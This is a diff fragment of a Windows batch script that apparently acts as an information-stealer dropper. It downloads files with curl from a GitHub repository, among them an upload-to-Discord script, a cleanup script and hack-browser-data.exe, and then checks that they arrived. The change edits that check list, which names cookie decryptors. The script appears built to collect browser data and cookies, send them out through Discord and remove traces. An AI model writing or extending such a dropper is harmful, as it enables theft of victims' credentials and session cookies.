@@ -45,7 +45,7 @@ curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/
 curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat
 
 REM Verify all critical downloads
-for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat chrome_cookie_decryptor.exe edge_cookie_decryptor.exe) do (
+for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat chrome_decryptor.exe) do (
     if not exist "%%F" (
         echo Error: Failed to download %%F
         exit /b 4
